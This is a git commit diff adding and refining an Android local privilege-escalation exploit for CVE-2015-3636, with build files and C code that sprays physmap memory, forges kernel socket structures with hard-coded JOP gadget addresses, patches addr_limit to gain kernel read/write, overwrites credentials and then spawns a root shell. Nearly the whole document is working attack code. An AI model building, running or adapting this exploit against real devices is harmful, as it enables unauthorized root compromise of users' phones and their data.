marsyy__littl_tools
commit 121ce02359776c8ec0915464cc3965479c95861a
Author:     daiyang <daiyang@antiy.cn>
AuthorDate: Mon Nov 14 11:51:31 2016 +0800
Commit:     daiyang <daiyang@antiy.cn>
CommitDate: Mon Nov 14 11:51:31 2016 +0800

    Develop | CVE-2015-3636 exploit for 64bits and 32bits devices
    
    Signed-off-by: daiyang <daiyang@antiy.cn>

diff --git a/android_root/cve-2015-3636/Android.mk b/android_root/cve-2015-3636/Android.mk
new file mode 100644
index 0000000..d661c89
--- /dev/null
+++ b/android_root/cve-2015-3636/Android.mk
@@ -0,0 +1,29 @@
+LOCAL_PATH:= $(call my-dir)
+include $(CLEAR_VARS)
+
+LOCAL_SRC_FILES:= \
+	exploit.c \
+
+
+LOCAL_SHARED_LIBRARIES := \
+	liblog \
+
+LOCAL_STATIC_LIBRARIES := get_root\
+
+LOCAL_C_INCLUDES := \
+    $(LOCAL_PATH)/../root_utils \
+    $(LOCAL_PATH)/ \
+	bionic \
+
+ifeq ($(shell expr $(PLATFORM_SDK_VERSION) "<" 23), 1)
+	LOCAL_SHARED_LIBRARIES += libstlport
+	LOCAL_C_INCLUDES += \
+		bionic/libstdc++/include \
+		external/stlport/stlport
+endif
+
+LOCAL_C_INCLUDES += \
+
+LOCAL_MODULE:= exp
+
+include $(BUILD_EXECUTABLE)
\ No newline at end of file
diff --git a/android_root/cve-2015-3636/exploit.c b/android_root/cve-2015-3636/exploit.c
index ed562e2..349f98d 100644
--- a/android_root/cve-2015-3636/exploit.c
+++ b/android_root/cve-2015-3636/exploit.c
@@ -14,8 +14,8 @@
 #include "get_root.h"
 
 #define TOTAL_SOCK_NUM 9500000
-#define MAGIC_BASE_ADDR 0x1000
-#define MAGIC_ADDR 0x1360
+#define MAGIC_BASE_ADDR 0x200000
+#define MAGIC_ADDR 0x200200
 #define MAGIC_NUM(x) (0x0dead000|x)
 #define MEM_MIN_LEN 0x1000
 #define TAG "CVE_2015_3636"
@@ -50,6 +50,8 @@
 #endif
 #endif
 
+#define POINT_ADD(x,y) ((size_t)x+y)
+
 int sock_fd[SOCK_NUM];
 void *map_address[MAP_NUM];
 int kill_child = 0;
@@ -104,7 +106,7 @@ static int lock_page_in_memory(void *address, size_t size)
 	return 0;
 }
 
-static void inline populate_pagetable_for_address(void *address)
+static inline void populate_pagetable_for_address(void *address)
 {
 	*(void **)address = NULL;
 }
@@ -115,7 +117,7 @@ static int map_prepare_avoid_crash(){
 	PROT_READ | PROT_WRITE,
 	MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
 	if(map!=(void *)MAGIC_BASE_ADDR){
-		printf("[-]0x1360 failed\n");
+		printf("[-]0x200200 failed\n");
 		return false;
 	}
 	printf("[+]map prepare ok map:%p\n",map);
@@ -142,7 +144,7 @@ static int make_vul_socket(unsigned int num){
 }
 
 
-static void fill_map_whth_time_magic(void *address,unsigned int index){
+static void fill_map_whth_time_magic(void *address){
 	unsigned int *p;
 	unsigned int i,size;
 	unsigned int higher,lower;
@@ -170,7 +172,7 @@ static int create_n_socket(int *sock,int num){
 }
 
 
-void inline wait_to_be_kill(){
+static inline void wait_to_be_kill(){
 	while(!end_child){
 		sleep(1);
 	}
@@ -185,6 +187,7 @@ static inline void clean_child(int *sock,int num){
 }
 
 static inline void set_clean_flag(int sig){
+	int a = sig;//unused
 	usleep(1000);
 	end_child = 1;
 }
@@ -301,8 +304,7 @@ static int override_physmap(){
 		map = mmap(NULL,PYHSMAP_LENTH,PROT_READ | PROT_WRITE | PROT_EXEC,MAP_ANONYMOUS | MAP_SHARED,-1,0);
 		if(map != NULL){
 			map_address[i] = map;
-			fill_map_whth_time_magic(map,i);
-			printf("%d\n",i);
+			fill_map_whth_time_magic(map);
 			if(try_and_get_target()){
 				return 1;
 			}
@@ -335,7 +337,7 @@ static int create_main_socket(){
 
 static inline void construct_jop_leak_sp_32(){
 	void *map;
-	map = mmap((void *)JOP_BASE_ADDR-0x100,0x1000,PROT_WRITE | PROT_READ | PROT_EXEC,MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS,-1,0);
+	map = mmap((void *)(JOP_BASE_ADDR-0x100),0x1000,PROT_WRITE | PROT_READ | PROT_EXEC,MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS,-1,0);
 	if((unsigned long)map!=JOP_BASE_ADDR-0x100){
 		printf("[-]mmap jop base addr failed\n");
 		return;
@@ -379,35 +381,40 @@ static inline void construct_fack_prot_leak_sp_32(){
 									// .text:C06F9F90                 BLX             R3
 }
 
-static void construct_mem_patch_aadr_limit_32(){
+static inline void construct_mem_patch_aadr_limit_32(){
 	fack_prot[0] = (void *)0xc0184e54;
 							// .text:C0184E54                 LDR             R3, [R4,#4]
 							// .text:C0184E58                 MOVT            R0, #0x333
 							// .text:C0184E5C                 STR             R1, [R2,#0x20]
 							// .text:C0184E60                 BLX             R3
-	*(unsigned *)(target_sock_addr2+4) = 0xc0a1747c; // sk+4--->R4+4
+	*(unsigned *)((unsigned int)target_sock_addr2+4) = 0xc0a1747c; // sk+4--->R4+4
 }
 
+
+
 static void prepare_target_1_32(){
 	construct_jop_leak_sp_32();
 	construct_fack_prot_leak_sp_32();
-	target_sock_prot_addr1 = target_sock_addr1+SOCKPROT_OFFSET;
+	target_sock_prot_addr1 = (void *)POINT_ADD(target_sock_addr1,SOCKPROT_OFFSET);
 	*(unsigned long *)target_sock_prot_addr1 = (unsigned long)&fack_prot[0];
-	*(int *)(target_sock_addr1+0x2c) = 0; 	//mmap_queue
-	*(long *)(target_sock_addr1+0x88) = 0xffff0000;//time_flag
-	*(long *)(target_sock_addr1+0x6c) = JOP_BASE_ADDR;
-	memset(target_sock_addr1+0x88,0,0x300); //avoid crash
+	*(int *)POINT_ADD(target_sock_addr1,0x2c) = 0; 	//mmap_queue
+	*(long *)POINT_ADD(target_sock_addr1,0x88) = 0xffff0000;//time_flag
+	*(long *)POINT_ADD(target_sock_addr1,0x6c) = JOP_BASE_ADDR;
+	memset((void *)POINT_ADD(target_sock_addr1,0x88),0,0x300); //avoid crash
+
+
+
 }
 
 
 static void prepare_target_2_32(){
 	construct_mem_patch_aadr_limit_32();
-	target_sock_prot_addr2 = target_sock_addr2+SOCKPROT_OFFSET;
+	target_sock_prot_addr2 = (void *)POINT_ADD(target_sock_addr2,SOCKPROT_OFFSET);
 	*(unsigned long *)target_sock_prot_addr2 = (unsigned long)&fack_prot[0];
-	*(int *)(target_sock_addr2+0x2c) = 0; 	//mmap_queue
-	*(long *)(target_sock_addr2+0x88) = 0xffff0000;//time_flag
-	*(long *)(target_sock_addr2+0x6c) = (unsigned long)kerner_sp_bottom+8-0x20; //R2  addr_limit-0x20
-	memset(target_sock_addr2+0x88,0,0x300); //avoid crash
+	*(int *)POINT_ADD(target_sock_addr2,0x2c) = 0; 	//mmap_queue
+	*(long *)POINT_ADD(target_sock_addr2,0x88)  = 0xffff0000;//time_flag
+	*(long *)POINT_ADD(target_sock_addr2,0x6c) = (unsigned long)kerner_sp_bottom+8-0x20; //R2  addr_limit-0x20
+	memset((void *)POINT_ADD(target_sock_addr2,0x88),0,0x300); //avoid crash
 }
 
 #else
@@ -466,23 +473,23 @@ static void construct_jop_leak_sp_64(){
 static void prepare_target_1_64(){
 	construct_jop_leak_sp_64();
 	construct_fack_prot_leak_sp_64();
-	target_sock_prot_addr1 = target_sock_addr1+SOCKPROT_OFFSET;
+	target_sock_prot_addr1 = (void *)POINT_ADD(target_sock_addr1,SOCKPROT_OFFSET);
 	*(unsigned long *)target_sock_prot_addr1 = (unsigned long)&fack_prot[0];
-	*(int *)(target_sock_addr1+RXHASH_OFFSET) = 0;
-	*(long *)(target_sock_addr1+SOCK_FLAG_OFFSET) = 0xffffffff;//time_flag,get x1 controled need this
-	*(long *)(target_sock_addr1+X1_OFFSET) = JOP_BASE_ADDR;
-	memset(target_sock_addr1+X1_OFFSET+0x20,0,0x300); //avoid crash
+	*(int *)POINT_ADD(target_sock_addr1,RXHASH_OFFSET) = 0;
+	*(long *)POINT_ADD(target_sock_addr1,SOCK_FLAG_OFFSET) = 0xffffffff;//time_flag,get x1 controled need this
+	*(long *)POINT_ADD(target_sock_addr1,X1_OFFSET) = JOP_BASE_ADDR;
+	memset((void *)POINT_ADD(target_sock_addr1,X1_OFFSET+0x20),0,0x300); //avoid crash
 }
 
 
 static void prepare_target_2_64(){
 	construct_mem_patch_aadr_limit_64();
-	target_sock_prot_addr2 = target_sock_addr2+SOCKPROT_OFFSET;
+	target_sock_prot_addr2 = (void *)POINT_ADD(target_sock_addr2,SOCKPROT_OFFSET);
 	*(unsigned long *)target_sock_prot_addr2 = (unsigned long)&fack_prot[0];
-	*(int *)(target_sock_addr2+RXHASH_OFFSET) = 0; 	//mmap_queue
-	*(unsigned long *)(target_sock_addr2+SOCK_FLAG_OFFSET) = 0xffffffff;//time_flag
-	*(unsigned long *)(target_sock_addr2+X1_OFFSET) = (unsigned long)kerner_sp_bottom+ADDR_LIMIT_OFFSET-0x48; //x1  addr_limit
-	memset(target_sock_addr2+X1_OFFSET+0x20,0,0x300); //avoid crash
+	*(int *)POINT_ADD(target_sock_addr2,RXHASH_OFFSET) = 0; 	//mmap_queue
+	*(long *)POINT_ADD(target_sock_addr2,SOCK_FLAG_OFFSET) = 0xffffffff;//time_flag
+	*(long *)POINT_ADD(target_sock_addr2,X1_OFFSET) = (long)kerner_sp_bottom+ADDR_LIMIT_OFFSET-0x48; //x1  addr_limit
+	memset((void *)POINT_ADD(target_sock_addr2,X1_OFFSET+0x20),0,0x300); //avoid crash
 }
 
 #endif
@@ -571,6 +578,7 @@ int main(){
 		printf("[+]ready to get root\n");
 	}
 	if(get_root_after_addrlimit_patched(kerner_sp_bottom)){
+		clean_physmap();
 		system("/system/bin/sh");
 	}
 	scanf("%d",&ret);
diff --git a/android_root/root_utils/Android.mk b/android_root/root_utils/Android.mk
new file mode 100644
index 0000000..559e89c
--- /dev/null
+++ b/android_root/root_utils/Android.mk
@@ -0,0 +1,19 @@
+LOCAL_PATH := $(call my-dir)
+include $(CLEAR_VARS)
+
+LOCAL_SRC_FILES := \
+	get_root.c
+
+LOCAL_C_INCLUDES := \
+	bionic \
+
+ifeq ($(shell expr $(PLATFORM_SDK_VERSION) "<" 23), 1)
+	LOCAL_SHARED_LIBRARIES += libstlport
+	LOCAL_C_INCLUDES += \
+						bionic/libstdc++/include \
+						external/stlport/stlport
+endif
+
+LOCAL_MODULE	:= get_root
+
+include $(BUILD_STATIC_LIBRARY)
\ No newline at end of file
diff --git a/android_root/root_utils/get_root.c b/android_root/root_utils/get_root.c
index 2530b94..6878334 100644
--- a/android_root/root_utils/get_root.c
+++ b/android_root/root_utils/get_root.c
@@ -59,10 +59,10 @@ static int read_kernel(void *target,void *buffer,unsigned size){
 
 
 static void *find_struct_cred_addr(void *task_struct_addr){
-	int ret,i;
+	int ret;
 	struct task_struct *task;
 	void *cred_addr = NULL;
-	unsigned int size = 0x100*sizeof(size_t);
+	unsigned int size = 0x100*sizeof(size_t),i;
 	int *taskbuf = (int *)malloc(size);
 	if(!taskbuf){
 		printf("[-]malloc task space failed\n");
@@ -255,12 +255,12 @@ void* compute_physmap(void *usr_addr){
 		printf("[-] read pagemap failed\n");
 		return NULL;
 	}
-	if(pentry & PRESENT_MASK == 0){
+	if((pentry & PRESENT_MASK) == 0){
 		printf("[-]%p is not present in physical memory\n",usr_addr);
 	}else{
 		PFN = pentry & PFN_MASK;
 		kaddr = (void *)((size_t)(PFN-PFN_MIN)*PAGE_SIZE+PHYS_OFFSET);
-		printf("[+]PFN[%p]:%llu,target_kaddr:%p\n",usr_addr,PFN,kaddr);
+		printf("[+]PFN[%p]:%llu,target_kaddr:%p\n",usr_addr,(long long unsigned int)PFN,kaddr);
 	}
 	return kaddr;
 }
\ No newline at end of file
